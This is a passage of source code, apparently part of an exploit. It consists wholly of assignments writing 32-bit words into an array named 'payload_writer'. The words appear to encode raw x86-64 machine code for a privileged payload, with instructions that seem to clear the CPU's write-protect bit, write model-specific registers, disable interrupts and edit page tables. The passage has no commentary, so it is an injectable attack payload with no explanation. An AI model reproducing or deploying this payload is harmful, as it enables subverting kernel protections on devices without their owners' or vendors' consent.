  payload_writer[2051] = 0x8d481774;
  payload_writer[2052] = 0x001d7a3d;
  payload_writer[2053] = 0x45c03100;
  payload_writer[2054] = 0x3145e431;
  payload_writer[2055] = 0x9915fff6;
  payload_writer[2056] = 0xeb000025;
  payload_writer[2057] = 0x048b485a;
  payload_writer[2058] = 0x38808b24;
  payload_writer[2059] = 0x44000002;
  payload_writer[2060] = 0x4c01708d;
  payload_writer[2061] = 0xc7e8f789;
  payload_writer[2062] = 0x48000016;
  payload_writer[2063] = 0x8949c085;
  payload_writer[2064] = 0x481475c4;
  payload_writer[2065] = 0x1d623d8d;
  payload_writer[2066] = 0xc0310000;
  payload_writer[2067] = 0x256a15ff;
  payload_writer[2068] = 0x64e90000;
  payload_writer[2069] = 0x48ffffff;
  payload_writer[2070] = 0x8b48c689;
  payload_writer[2071] = 0x8b48207b;
  payload_writer[2072] = 0x31102444;
  payload_writer[2073] = 0xf2894cc9;
  payload_writer[2074] = 0xc085d0ff;
  payload_writer[2075] = 0x1774c589;
  payload_writer[2076] = 0x513d8d48;
  payload_writer[2077] = 0x3100001d;
  payload_writer[2078] = 0x3d15ffc0;
  payload_writer[2079] = 0x45000025;
  payload_writer[2080] = 0x3fe9ff31;
  payload_writer[2081] = 0x4c000001;
  payload_writer[2082] = 0x08247c03;
  payload_writer[2083] = 0x3444c643;
  payload_writer[2084] = 0x8d4800ff;
  payload_writer[2085] = 0x001d4a3d;
  payload_writer[2086] = 0x4cc03100;
  payload_writer[2087] = 0x08247c89;
  payload_writer[2088] = 0x251615ff;
  payload_writer[2089] = 0x8b480000;
  payload_writer[2090] = 0x8d480873;
  payload_writer[2091] = 0x001d463d;
  payload_writer[2092] = 0xffc03100;
  payload_writer[2093] = 0x00250315;
  payload_writer[2094] = 0x538b4800;
  payload_writer[2095] = 0x3d8d4818;
  payload_writer[2096] = 0x00001d57;
  payload_writer[2097] = 0x24748b48;
  payload_writer[2098] = 0xffc03108;
  payload_writer[2099] = 0x0024eb15;
  payload_writer[2100] = 0xe6894c00;
  payload_writer[2101] = 0x743d8d48;
  payload_writer[2102] = 0x3100001d;
  payload_writer[2103] = 0xd915ffc0;
  payload_writer[2104] = 0x48000024;
  payload_writer[2105] = 0x4824348b;
  payload_writer[2106] = 0x1d7e3d8d;
  payload_writer[2107] = 0xc0310000;
  payload_writer[2108] = 0x24c615ff;
  payload_writer[2109] = 0x894c0000;
  payload_writer[2110] = 0x3d8d48ee;
  payload_writer[2111] = 0x00001d89;
  payload_writer[2112] = 0x15ffc031;
  payload_writer[2113] = 0x000024b4;
  payload_writer[2114] = 0x001000bf;
  payload_writer[2115] = 0x15f0e800;
  payload_writer[2116] = 0x85480000;
  payload_writer[2117] = 0xc78949c0;
  payload_writer[2118] = 0x8d481975;
  payload_writer[2119] = 0x001d853d;
  payload_writer[2120] = 0xffc03100;
  payload_writer[2121] = 0x00249315;
  payload_writer[2122] = 0x000cbd00;
  payload_writer[2123] = 0x93e90000;
  payload_writer[2124] = 0x48000000;
  payload_writer[2125] = 0x4824348b;
  payload_writer[2126] = 0x7be8c789;
  payload_writer[2127] = 0x48000008;
  payload_writer[2128] = 0x08244c8b;
  payload_writer[2129] = 0x48ea894c;
  payload_writer[2130] = 0x4d243c8b;
  payload_writer[2131] = 0x894ce089;
  payload_writer[2132] = 0x0840e8fe;
  payload_writer[2133] = 0x8b480000;
  payload_writer[2134] = 0x48182474;
  payload_writer[2135] = 0x0c093d8d;
  payload_writer[2136] = 0x17e80000;
  payload_writer[2137] = 0x48000016;
  payload_writer[2138] = 0x244e158b;
  payload_writer[2139] = 0xc0850000;
  payload_writer[2140] = 0x8d481075;
  payload_writer[2141] = 0x001d443d;
  payload_writer[2142] = 0x0016bd00;
  payload_writer[2143] = 0xd2ff0000;
  payload_writer[2144] = 0x8d4844eb;
  payload_writer[2145] = 0x001d553d;
  payload_writer[2146] = 0xffc03100;
  payload_writer[2147] = 0x3d8d48d2;
  payload_writer[2148] = 0x00001d82;
  payload_writer[2149] = 0x15ffc031;
  payload_writer[2150] = 0x00002420;
  payload_writer[2151] = 0xab3d8d48;
  payload_writer[2152] = 0x3100001d;
  payload_writer[2153] = 0x1115ffc0;
  payload_writer[2154] = 0xeb000024;
  payload_writer[2155] = 0x04c7484a;
  payload_writer[2156] = 0x00000024;
  payload_writer[2157] = 0xed314500;
  payload_writer[2158] = 0x45e43145;
  payload_writer[2159] = 0x3145f631;
  payload_writer[2160] = 0x0002bdff;
  payload_writer[2161] = 0x894c0000;
  payload_writer[2162] = 0xe7894cf6;
  payload_writer[2163] = 0x001591e8;
  payload_writer[2164] = 0x1000be00;
  payload_writer[2165] = 0x894c0000;
  payload_writer[2166] = 0x1584e8ff;
  payload_writer[2167] = 0x8b480000;
  payload_writer[2168] = 0x8b480873;
  payload_writer[2169] = 0x77e8243c;
  payload_writer[2170] = 0x48000015;
  payload_writer[2171] = 0x4c18738b;
  payload_writer[2172] = 0x6be8ef89;
  payload_writer[2173] = 0x48000015;
  payload_writer[2174] = 0x8928c483;
  payload_writer[2175] = 0x415d5be8;
  payload_writer[2176] = 0x415d415c;
  payload_writer[2177] = 0xc35f415e;
  payload_writer[2178] = 0x74ff8548;
  payload_writer[2179] = 0xf685485e;
  payload_writer[2180] = 0x8d4c5974;
  payload_writer[2181] = 0xc031ff42;
  payload_writer[2182] = 0x00073c80;
  payload_writer[2183] = 0x01508d4c;
  payload_writer[2184] = 0x39490a74;
  payload_writer[2185] = 0x4c0576c0;
  payload_writer[2186] = 0xecebd089;
  payload_writer[2187] = 0x4dd2394c;
  payload_writer[2188] = 0x45c2470f;
  payload_writer[2189] = 0x394dc931;
  payload_writer[2190] = 0x460d74c8;
  payload_writer[2191] = 0x460f1c8a;
  payload_writer[2192] = 0x490e1c88;
  payload_writer[2193] = 0xeeebc1ff;
  payload_writer[2194] = 0x42c23948;
  payload_writer[2195] = 0x000604c6;
  payload_writer[2196] = 0x85480e77;
  payload_writer[2197] = 0x003fb8c9;
  payload_writer[2198] = 0x14740000;
  payload_writer[2199] = 0xc3118948;
  payload_writer[2200] = 0x8548c031;
  payload_writer[2201] = 0x4c0974c9;
  payload_writer[2202] = 0xb8c31189;
  payload_writer[2203] = 0x0000000e;
  payload_writer[2204] = 0x415541c3;
  payload_writer[2205] = 0x48535554;
  payload_writer[2206] = 0x0f18ec83;
  payload_writer[2207] = 0x2548c020;
  payload_writer[2208] = 0xfffeffff;
  payload_writer[2209] = 0xfac0220f;
  payload_writer[2210] = 0x25058b48;
  payload_writer[2211] = 0xb9000023;
  payload_writer[2212] = 0xfee00410;
  payload_writer[2213] = 0xe00320ba;
  payload_writer[2214] = 0x0380befe;
  payload_writer[2215] = 0x0948fee0;
  payload_writer[2216] = 0x0101c7c1;
  payload_writer[2217] = 0x48000000;
  payload_writer[2218] = 0x0948c789;
  payload_writer[2219] = 0xc28348d7;
  payload_writer[2220] = 0xf2394810;
  payload_writer[2221] = 0x000007c7;
  payload_writer[2222] = 0xeb750001;
  payload_writer[2223] = 0xe00480ba;
  payload_writer[2224] = 0x0500befe;
  payload_writer[2225] = 0x8948fee0;
  payload_writer[2226] = 0xd70948c7;
  payload_writer[2227] = 0x10c28348;
  payload_writer[2228] = 0xc7f23948;
  payload_writer[2229] = 0xffffff07;
  payload_writer[2230] = 0x48eb75ff;
  payload_writer[2231] = 0x02c7c209;
  payload_writer[2232] = 0x00010000;
  payload_writer[2233] = 0xe00510ba;
  payload_writer[2234] = 0xc20948fe;
  payload_writer[2235] = 0x000002c7;
  payload_writer[2236] = 0x20ba0001;
  payload_writer[2237] = 0x48fee005;
  payload_writer[2238] = 0x02c7c209;
  payload_writer[2239] = 0x00010000;
  payload_writer[2240] = 0xe00530ba;
  payload_writer[2241] = 0xd00948fe;
  payload_writer[2242] = 0x100000ba;
  payload_writer[2243] = 0x0000c700;
  payload_writer[2244] = 0xb8000100;
  payload_writer[2245] = 0x01000000;
  payload_writer[2246] = 0x000001c7;
  payload_writer[2247] = 0x13b90000;
  payload_writer[2248] = 0x0f000004;
  payload_writer[2249] = 0x0408b930;
  payload_writer[2250] = 0x300fc000;
  payload_writer[2251] = 0x200f41fa;
  payload_writer[2252] = 0xc8894cc1;
  payload_writer[2253] = 0xffff2548;
  payload_writer[2254] = 0x0d48dfff;
  payload_writer[2255] = 0x40000000;
  payload_writer[2256] = 0x0fc0220f;
  payload_writer[2257] = 0xd8200f09;
  payload_writer[2258] = 0x31d8220f;
  payload_writer[2259] = 0xffba41f6;
  payload_writer[2260] = 0x44000002;
  payload_writer[2261] = 0x8948d189;
  payload_writer[2262] = 0xf28948f0;
  payload_writer[2263] = 0xb841300f;
  payload_writer[2264] = 0x00000006;
  payload_writer[2265] = 0x000200b9;
  payload_writer[2266] = 0xc0894c00;
  payload_writer[2267] = 0x00bb300f;
  payload_writer[2268] = 0xbf800008;
  payload_writer[2269] = 0x000000ff;
  payload_writer[2270] = 0x000201b9;
  payload_writer[2271] = 0xd8894800;
  payload_writer[2272] = 0x0ffa8948;
  payload_writer[2273] = 0x01bb4130;
  payload_writer[2274] = 0xb9000000;
  payload_writer[2275] = 0x00000202;
  payload_writer[2276] = 0x4cc0894c;
  payload_writer[2277] = 0x300fda89;
  payload_writer[2278] = 0x000203b9;
  payload_writer[2279] = 0x0800b800;
  payload_writer[2280] = 0x89480000;
  payload_writer[2281] = 0xb9300ffa;
  payload_writer[2282] = 0x00000204;
  payload_writer[2283] = 0x000002ba;
  payload_writer[2284] = 0xc0894c00;
  payload_writer[2285] = 0x05b9300f;
  payload_writer[2286] = 0x48000002;
  payload_writer[2287] = 0x8948d889;
  payload_writer[2288] = 0xb9300ffa;
  payload_writer[2289] = 0x00000206;
  payload_writer[2290] = 0x4cf08948;
  payload_writer[2291] = 0x300fda89;
  payload_writer[2292] = 0x000207b9;
  payload_writer[2293] = 0x0800b800;
  payload_writer[2294] = 0x8948c000;
  payload_writer[2295] = 0x0f300ffa;
  payload_writer[2296] = 0xd8200f09;
  payload_writer[2297] = 0xb8d8220f;
  payload_writer[2298] = 0x00000c00;
  payload_writer[2299] = 0x48d18944;
  payload_writer[2300] = 0x300ff289;
  payload_writer[2301] = 0xc1220f41;
  payload_writer[2302] = 0x048b65fb;
  payload_writer[2303] = 0x00003425;
  payload_writer[2304] = 0x74c08500;
  payload_writer[2305] = 0x05fff00b;
  payload_writer[2306] = 0x00002120;
  payload_writer[2307] = 0xfcebf4fa;
  payload_writer[2308] = 0xb33d8d48;
  payload_writer[2309] = 0xe800001b;
  payload_writer[2310] = 0x00000aa5;
  payload_writer[2311] = 0x000007ba;
  payload_writer[2312] = 0xf0d08900;
  payload_writer[2313] = 0x0115b10f;
  payload_writer[2314] = 0x75000021;
  payload_writer[2315] = 0x3d8d48f4;
  payload_writer[2316] = 0x00001bbc;
  payload_writer[2317] = 0x000a88e8;
  payload_writer[2318] = 0xe0200f00;
  payload_writer[2319] = 0xff7f2548;
  payload_writer[2320] = 0x220fffff;
  payload_writer[2321] = 0xda200fe0;
  payload_writer[2322] = 0x650d8b48;
  payload_writer[2323] = 0x48000021;
  payload_writer[2324] = 0xfff000b8;
  payload_writer[2325] = 0x0fffffff;
  payload_writer[2326] = 0xc2214800;
  payload_writer[2327] = 0x000087bb;
  payload_writer[2328] = 0xca094880;
  payload_writer[2329] = 0x48022348;
  payload_writer[2330] = 0x8948c809;
  payload_writer[2331] = 0x81481058;
  payload_writer[2332] = 0x000000c3;
  payload_writer[2333] = 0x00c74840;
  payload_writer[2334] = 0x00000087;
  payload_writer[2335] = 0x0840c748;
  payload_writer[2336] = 0x40000087;
  payload_writer[2337] = 0x18588948;
  payload_writer[2338] = 0x00c6c031;
  payload_writer[2339] = 0xc0ff4800;
  payload_writer[2340] = 0x10003d48;
  payload_writer[2341] = 0xf2750000;
  payload_writer[2342] = 0x151d8b48;
  payload_writer[2343] = 0x31000021;
  payload_writer[2344] = 0x10cf80c0;
  payload_writer[2345] = 0x000304c6;
  payload_writer[2346] = 0x48c0ff48;
  payload_writer[2347] = 0x0020003d;
  payload_writer[2348] = 0x48f17500;
  payload_writer[2349] = 0x20fa058b;
  payload_writer[2350] = 0x8d480000;
  payload_writer[2351] = 0x00100093;
  payload_writer[2352] = 0x3d8d4800;
  payload_writer[2353] = 0x00001b48;
  payload_writer[2354] = 0xf2f8e2c4;
  payload_writer[2355] = 0xc88348c2;
  payload_writer[2356] = 0x03894807;
  payload_writer[2357] = 0xd9158b48;
  payload_writer[2358] = 0x48000020;
  payload_writer[2359] = 0x8127eac1;
  payload_writer[2360] = 0x0001ffe2;
  payload_writer[2361] = 0x04894800;
  payload_writer[2362] = 0x0087b8d3;
  payload_writer[2363] = 0x89488000;
  payload_writer[2364] = 0x00101083;
  payload_writer[2365] = 0x00054800;
  payload_writer[2366] = 0x48400000;
  payload_writer[2367] = 0x10188389;
  payload_writer[2368] = 0xc7480000;
  payload_writer[2369] = 0x00100083;
  payload_writer[2370] = 0x00008700;
  payload_writer[2371] = 0x83c74800;
  payload_writer[2372] = 0x00001008;
  payload_writer[2373] = 0x40000087;
  payload_writer[2374] = 0x0009a4e8;
  payload_writer[2375] = 0x058b4800;
  payload_writer[2376] = 0x00002090;
  payload_writer[2377] = 0x2444c766;
  payload_writer[2378] = 0x4807ff06;
  payload_writer[2379] = 0x2000938d;
  payload_writer[2380] = 0xe2c40000;
  payload_writer[2381] = 0x48c2f2f8;
  payload_writer[2382] = 0x08244489;
  payload_writer[2383] = 0x04c6c031;
  payload_writer[2384] = 0xff480002;
  payload_writer[2385] = 0x003d48c0;
  payload_writer[2386] = 0x75000008;
  payload_writer[2387] = 0xffb848f1;
  payload_writer[2388] = 0x000000ff;
  payload_writer[2389] = 0x48002f9a;
  payload_writer[2390] = 0x1acc3d8d;
  payload_writer[2391] = 0x89480000;
  payload_writer[2392] = 0x00201083;
  payload_writer[2393] = 0xffb84800;
  payload_writer[2394] = 0x000000ff;
  payload_writer[2395] = 0x48000f92;
  payload_writer[2396] = 0x20188389;
  payload_writer[2397] = 0xb8480000;
  payload_writer[2398] = 0x00000000;
  payload_writer[2399] = 0x00009900;
  payload_writer[2400] = 0x20838948;
  payload_writer[2401] = 0xe8000020;
  payload_writer[2402] = 0x00000935;
  payload_writer[2403] = 0x2444b70f;
  payload_writer[2404] = 0x0d8d4806;
  payload_writer[2405] = 0x00000841;
  payload_writer[2406] = 0x24548b48;
  payload_writer[2407] = 0x6c8d4c08;
  payload_writer[2408] = 0x8b480102;
  payload_writer[2409] = 0x00163f15;
  payload_writer[2410] = 0x48c03100;
  payload_writer[2411] = 0x0e74c239;
  payload_writer[2412] = 0x01348a40;
  payload_writer[2413] = 0x05748841;
  payload_writer[2414] = 0xc0ff4800;
  payload_writer[2415] = 0x8b4cedeb;
  payload_writer[2416] = 0x001fef25;
  payload_writer[2417] = 0x3d8d4800;
  payload_writer[2418] = 0x00001a79;
  payload_writer[2419] = 0xf29842c4;
  payload_writer[2420] = 0x25034ce5;
  payload_writer[2421] = 0x00001610;
  payload_writer[2422] = 0x0008e4e8;
  payload_writer[2423] = 0x058b4c00;
  payload_writer[2424] = 0x00001f80;
  payload_writer[2425] = 0x000400b9;
  payload_writer[2426] = 0x158b4800;
  payload_writer[2427] = 0x00001f64;
  payload_writer[2428] = 0xbd058b48;
  payload_writer[2429] = 0x4900001f;
  payload_writer[2430] = 0x0024ac8d;
  payload_writer[2431] = 0x48000002;
  payload_writer[2432] = 0x894cef89;
  payload_writer[2433] = 0xc48149c6;
  payload_writer[2434] = 0x00001200;
  payload_writer[2435] = 0xe2c4a5f3;
  payload_writer[2436] = 0xc6caf278;
  payload_writer[2437] = 0x00021085;
  payload_writer[2438] = 0x8d89d000;
  payload_writer[2439] = 0x00000218;
  payload_writer[2440] = 0x350d8b48;
  payload_writer[2441] = 0x4800001f;
  payload_writer[2442] = 0x8b41d0f7;
  payload_writer[2443] = 0x000238b0;
  payload_writer[2444] = 0x3c85c700;
  payload_writer[2445] = 0x05000002;
  payload_writer[2446] = 0x48000000;
  payload_writer[2447] = 0x8d89c221;
  payload_writer[2448] = 0x0000021c;
  payload_writer[2449] = 0x20e9c148;
  payload_writer[2450] = 0x00c48d89;
  payload_writer[2451] = 0x8b480000;
  payload_writer[2452] = 0x001f170d;
  payload_writer[2453] = 0xeac14800;
  payload_writer[2454] = 0xa5894420;
  payload_writer[2455] = 0x00000228;
  payload_writer[2456] = 0x89c42141;
  payload_writer[2457] = 0x0000c095;
  payload_writer[2458] = 0x48c03100;
  payload_writer[2459] = 0x80ff568d;
  payload_writer[2460] = 0x4100013c;
  payload_writer[2461] = 0x48c0950f;
  payload_writer[2462] = 0x0f40c239;
  payload_writer[2463] = 0xff48c797;
  payload_writer[2464] = 0xf88441c0;
  payload_writer[2465] = 0x3948e975;
  payload_writer[2466] = 0x470f48c6;
  payload_writer[2467] = 0x48c031d0;
  payload_writer[2468] = 0x0d74c239;
  payload_writer[2469] = 0x01348a40;
  payload_writer[2470] = 0x04348841;
  payload_writer[2471] = 0xebc0ff48;
  payload_writer[2472] = 0x04c641ee;
  payload_writer[2473] = 0x8d480014;
  payload_writer[2474] = 0x0019ba3d;
  payload_writer[2475] = 0x080fe800;
  payload_writer[2476] = 0x18b80000;
  payload_writer[2477] = 0x48fc0000;
  payload_writer[2478] = 0x1ef6050b;
  payload_writer[2479] = 0xe0bf0000;
  payload_writer[2480] = 0x48f80a00;
  payload_writer[2481] = 0x8348108b;
  payload_writer[2482] = 0x8948fee2;
  payload_writer[2483] = 0x0fe5e810;
  payload_writer[2484] = 0xe0bf0000;
  payload_writer[2485] = 0xe8f80a10;
  payload_writer[2486] = 0x00000fdb;
  payload_writer[2487] = 0x0a20e0bf;
  payload_writer[2488] = 0x0fd1e8f8;
  payload_writer[2489] = 0xe0bf0000;
  payload_writer[2490] = 0xe8f80a30;
  payload_writer[2491] = 0x00000fc7;
  payload_writer[2492] = 0x0a40e0bf;
  payload_writer[2493] = 0x0fbde8f8;
  payload_writer[2494] = 0xe0bf0000;
  payload_writer[2495] = 0xe8f80a50;
  payload_writer[2496] = 0x00000fb3;
  payload_writer[2497] = 0x0a60e0bf;
  payload_writer[2498] = 0x0fa9e8f8;
  payload_writer[2499] = 0xe0bf0000;
  payload_writer[2500] = 0xe8f80a70;
  payload_writer[2501] = 0x00000f9f;
  payload_writer[2502] = 0x683d8d48;
  payload_writer[2503] = 0xe8000019;
  payload_writer[2504] = 0x0000079d;
  payload_writer[2505] = 0x89058b48;
  payload_writer[2506] = 0xb900001e;
  payload_writer[2507] = 0xe4802024;
  payload_writer[2508] = 0x802c04ba;
  payload_writer[2509] = 0x3d8d48e4;
  payload_writer[2510] = 0x00001969;
  payload_writer[2511] = 0x48c10948;
  payload_writer[2512] = 0x01c7c209;
  payload_writer[2513] = 0x00000000;
  payload_writer[2514] = 0x000002c7;
  payload_writer[2515] = 0x01c70000;
  payload_writer[2516] = 0x0f3f0f00;
  payload_writer[2517] = 0x802068b9;
  payload_writer[2518] = 0xc10948e4;
  payload_writer[2519] = 0x040001c7;
  payload_writer[2520] = 0x02c70000;
  payload_writer[2521] = 0x0f000000;
  payload_writer[2522] = 0x805428ba;
  payload_writer[2523] = 0xd00948e4;
  payload_writer[2524] = 0x040000c7;
  payload_writer[2525] = 0x46e80000;
  payload_writer[2526] = 0xb8000007;
  payload_writer[2527] = 0xe48086d8;
  payload_writer[2528] = 0x2d050b48;
  payload_writer[2529] = 0x4100001e;
  payload_writer[2530] = 0x805e00b8;
  payload_writer[2531] = 0x5e04bfe4;
  payload_writer[2532] = 0xba41e480;
  payload_writer[2533] = 0x80000000;
  payload_writer[2534] = 0x805e18be;
  payload_writer[2535] = 0x00c748e4;
  payload_writer[2536] = 0x15000000;
  payload_writer[2537] = 0x808234b8;
  payload_writer[2538] = 0x050b48e4;
  payload_writer[2539] = 0x00001e04;
  payload_writer[2540] = 0x0000c748;
  payload_writer[2541] = 0xb8500000;
  payload_writer[2542] = 0xe480d048;
  payload_writer[2543] = 0xf1050b48;
  payload_writer[2544] = 0x4800001d;
  payload_writer[2545] = 0x000100c7;
  payload_writer[2546] = 0x48b80000;
  payload_writer[2547] = 0x48e480d8;
  payload_writer[2548] = 0x1dde050b;
  payload_writer[2549] = 0xc7480000;
  payload_writer[2550] = 0x00000100;
  payload_writer[2551] = 0xc300b800;
  payload_writer[2552] = 0x0b48e480;
  payload_writer[2553] = 0x001dcb05;
  payload_writer[2554] = 0x00c74800;
  payload_writer[2555] = 0x00000000;
  payload_writer[2556] = 0x80c1a8b8;
  payload_writer[2557] = 0x050b48e4;
  payload_writer[2558] = 0x00001db8;
  payload_writer[2559] = 0x48108b48;
  payload_writer[2560] = 0xffffe281;
  payload_writer[2561] = 0x8948ffe7;
  payload_writer[2562] = 0x8020b810;
  payload_writer[2563] = 0x8b48e480;
  payload_writer[2564] = 0x001d9f0d;
  payload_writer[2565] = 0xc1094800;
  payload_writer[2566] = 0x48118b48;
  payload_writer[2567] = 0x0005ca81;
  payload_writer[2568] = 0x89480003;
  payload_writer[2569] = 0x050b4811;
  payload_writer[2570] = 0x00001d88;
  payload_writer[2571] = 0x48108b48;
  payload_writer[2572] = 0xfffae281;
  payload_writer[2573] = 0x8948fffc;
  payload_writer[2574] = 0x0e60b810;
  payload_writer[2575] = 0x8b48e480;
  payload_writer[2576] = 0x001d6f0d;
  payload_writer[2577] = 0xc1094800;
  payload_writer[2578] = 0x48118b48;
  payload_writer[2579] = 0x0140ca81;
  payload_writer[2580] = 0x89480010;
  payload_writer[2581] = 0x5e1cb911;
  payload_writer[2582] = 0x0b48e480;
  payload_writer[2583] = 0x001d5305;
  payload_writer[2584] = 0x108b4800;
  payload_writer[2585] = 0xbfe28148;
  payload_writer[2586] = 0x48ffeffe;
  payload_writer[2587] = 0x30ba1089;
  payload_writer[2588] = 0x48e4805e;
  payload_writer[2589] = 0x1d3a058b;
  payload_writer[2590] = 0x094c0000;
  payload_writer[2591] = 0x00c748c0;
  payload_writer[2592] = 0x00000154;
  payload_writer[2593] = 0x29058b48;
  payload_writer[2594] = 0x4800001d;
  payload_writer[2595] = 0x894cf809;
  payload_writer[2596] = 0x058b4810;
  payload_writer[2597] = 0x00001d1c;
  payload_writer[2598] = 0x48f00948;
  payload_writer[2599] = 0x015400c7;
  payload_writer[2600] = 0x8b480000;
  payload_writer[2601] = 0x001d0b05;
  payload_writer[2602] = 0xc8094800;
  payload_writer[2603] = 0x4810894c;
  payload_writer[2604] = 0x1cfe058b;
  payload_writer[2605] = 0x09480000;
  payload_writer[2606] = 0x00c748d0;
  payload_writer[2607] = 0x00000154;
  payload_writer[2608] = 0x805e34b8;
  payload_writer[2609] = 0x0d8b4ce4;
  payload_writer[2610] = 0x00001ce8;
  payload_writer[2611] = 0x4dc10949;
  payload_writer[2612] = 0xb9411189;
  payload_writer[2613] = 0xe4813404;
  payload_writer[2614] = 0xd50d0b4c;
  payload_writer[2615] = 0x4900001c;
  payload_writer[2616] = 0x000101c7;
  payload_writer[2617] = 0xb9410000;
  payload_writer[2618] = 0xe481340c;
  payload_writer[2619] = 0xc10d0b4c;
  payload_writer[2620] = 0x4900001c;
  payload_writer[2621] = 0x000101c7;
  payload_writer[2622] = 0x0b4c0000;
  payload_writer[2623] = 0x001cb305;
  payload_writer[2624] = 0x00c74900;
  payload_writer[2625] = 0x00000156;
  payload_writer[2626] = 0xa53d0b48;
  payload_writer[2627] = 0x4800001c;
  payload_writer[2628] = 0x00f007c7;
  payload_writer[2629] = 0x8d481856;
  payload_writer[2630] = 0x0017a13d;
  payload_writer[2631] = 0x350b4800;
  payload_writer[2632] = 0x00001c90;
  payload_writer[2633] = 0x5606c748;
  payload_writer[2634] = 0x48000001;
  payload_writer[2635] = 0x1c820d0b;
  payload_writer[2636] = 0xc7480000;
  payload_writer[2637] = 0x0000f001;
  payload_writer[2638] = 0x150b4850;
  payload_writer[2639] = 0x00001c74;
  payload_writer[2640] = 0x5602c748;
  payload_writer[2641] = 0x48000001;
  payload_writer[2642] = 0x1c66050b;
  payload_writer[2643] = 0xc7480000;
  payload_writer[2644] = 0x4510f000;
  payload_writer[2645] = 0x0567e801;
  payload_writer[2646] = 0x8b480000;
  payload_writer[2647] = 0x001c533d;
  payload_writer[2648] = 0xee894800;
  payload_writer[2649] = 0x244c8d48;
  payload_writer[2650] = 0xd7f74806;
  payload_writer[2651] = 0x48fb2148;
  payload_writer[2652] = 0x2348fe21;
  payload_writer[2653] = 0x001bd33d;
  payload_writer[2654] = 0xda894800;
  payload_writer[2655] = 0x48d5ff41;
  payload_writer[2656] = 0x17653d8d;
  payload_writer[2657] = 0x36e80000;
  payload_writer[2658] = 0x48000005;
  payload_writer[2659] = 0x5b18c483;
  payload_writer[2660] = 0x415c415d;
  payload_writer[2661] = 0x8948c35d;
  payload_writer[2662] = 0x001baf3d;
  payload_writer[2663] = 0x35894800;
  payload_writer[2664] = 0x00001bc0;
  payload_writer[2665] = 0xa9158948;
  payload_writer[2666] = 0x4800001b;
  payload_writer[2667] = 0x1baa0d89;
  payload_writer[2668] = 0x894c0000;
  payload_writer[2669] = 0x001bb305;
  payload_writer[2670] = 0xc031c300;
  payload_writer[2671] = 0x000704c6;
  payload_writer[2672] = 0x48c0ff48;
  payload_writer[2673] = 0x0010003d;
  payload_writer[2674] = 0x0ff17500;
  payload_writer[2675] = 0x020196b6;
  payload_writer[2676] = 0x8d480000;
  payload_writer[2677] = 0x0001f18f;
  payload_writer[2678] = 0xc6814800;
  payload_writer[2679] = 0x000001f1;
  payload_writer[2680] = 0x8348c031;
  payload_writer[2681] = 0x8a4411c2;
  payload_writer[2682] = 0x88440604;
  payload_writer[2683] = 0xff480104;
  payload_writer[2684] = 0xc23948c0;
  payload_writer[2685] = 0xb60ff077;
  payload_writer[2686] = 0x0001e897;
  payload_writer[2687] = 0x0000be00;
  payload_writer[2688] = 0x89488000;
  payload_writer[2689] = 0xd26b48d0;
  payload_writer[2690] = 0xfa014814;
  payload_writer[2691] = 0xd082c748;
  payload_writer[2692] = 0x00000002;
  payload_writer[2693] = 0x48000000;
  payload_writer[2694] = 0x02d882c7;
  payload_writer[2695] = 0x80000000;
  payload_writer[2696] = 0x82c70000;
  payload_writer[2697] = 0x000002e0;
  payload_writer[2698] = 0x00000001;
  payload_writer[2699] = 0x0f01508d;
  payload_writer[2700] = 0x6b48d2b6;
  payload_writer[2701] = 0x014814d2;
  payload_writer[2702] = 0x82c748fa;
  payload_writer[2703] = 0x000002d0;
  payload_writer[2704] = 0x00008000;
  payload_writer[2705] = 0xd882c748;
  payload_writer[2706] = 0x00000002;
  payload_writer[2707] = 0xc7000780;
  payload_writer[2708] = 0x0002e082;
  payload_writer[2709] = 0x00000200;
  payload_writer[2710] = 0x02508d00;
  payload_writer[2711] = 0x48d2b60f;
  payload_writer[2712] = 0x4814d26b;
  payload_writer[2713] = 0xc748fa01;
  payload_writer[2714] = 0x0002d082;
  payload_writer[2715] = 0x08000000;
  payload_writer[2716] = 0x82c74800;
  payload_writer[2717] = 0x000002d8;
  payload_writer[2718] = 0x0001a000;
  payload_writer[2719] = 0x02e082c7;
  payload_writer[2720] = 0x00010000;
  payload_writer[2721] = 0x508d0000;
  payload_writer[2722] = 0xd2b60f03;
  payload_writer[2723] = 0x14d26b48;
  payload_writer[2724] = 0x48fa0148;
  payload_writer[2725] = 0x02d082c7;
  payload_writer[2726] = 0xa0000000;
  payload_writer[2727] = 0xc7480009;
  payload_writer[2728] = 0x0002d882;
  payload_writer[2729] = 0x00600000;
  payload_writer[2730] = 0xe082c700;
  payload_writer[2731] = 0x02000002;
  payload_writer[2732] = 0x8d000000;
  payload_writer[2733] = 0xb60f0450;
  payload_writer[2734] = 0xd26b48d2;
  payload_writer[2735] = 0xfa014814;
  payload_writer[2736] = 0xd082c748;
  payload_writer[2737] = 0x00000002;
  payload_writer[2738] = 0x48000a00;
  payload_writer[2739] = 0x02d882c7;
  payload_writer[2740] = 0x00000000;
  payload_writer[2741] = 0x82c70002;
  payload_writer[2742] = 0x000002e0;
  payload_writer[2743] = 0x00000002;
  payload_writer[2744] = 0x0f05508d;
  payload_writer[2745] = 0x6b48d2b6;
  payload_writer[2746] = 0x014814d2;
  payload_writer[2747] = 0x82c748fa;
  payload_writer[2748] = 0x000002d0;
  payload_writer[2749] = 0x000e0000;
  payload_writer[2750] = 0xd882c748;
  payload_writer[2751] = 0x00000002;
  payload_writer[2752] = 0xc7000100;
  payload_writer[2753] = 0x0002e082;
  payload_writer[2754] = 0x00000300;
  payload_writer[2755] = 0x06508d00;
  payload_writer[2756] = 0x48d2b60f;
  payload_writer[2757] = 0x4814d26b;
  payload_writer[2758] = 0xc748fa01;
  payload_writer[2759] = 0x0002d082;
  payload_writer[2760] = 0x10000000;
  payload_writer[2761] = 0x82c74800;
  payload_writer[2762] = 0x000002d8;
  payload_writer[2763] = 0x00300000;
  payload_writer[2764] = 0x02e082c7;
  payload_writer[2765] = 0x00010000;
  payload_writer[2766] = 0x508d0000;
  payload_writer[2767] = 0xd2b60f07;
  payload_writer[2768] = 0x14d26b48;
  payload_writer[2769] = 0x48fa0148;
  payload_writer[2770] = 0x02d082c7;
  payload_writer[2771] = 0x00000000;
  payload_writer[2772] = 0xc7480040;
  payload_writer[2773] = 0x0002d882;
  payload_writer[2774] = 0x08000000;
  payload_writer[2775] = 0xe082c700;
  payload_writer[2776] = 0x02000002;
  payload_writer[2777] = 0x8d000000;
  payload_writer[2778] = 0xb60f0850;
  payload_writer[2779] = 0xd26b48d2;
  payload_writer[2780] = 0xfa014814;
  payload_writer[2781] = 0xd082c748;
  payload_writer[2782] = 0x00000002;
  payload_writer[2783] = 0x48004800;
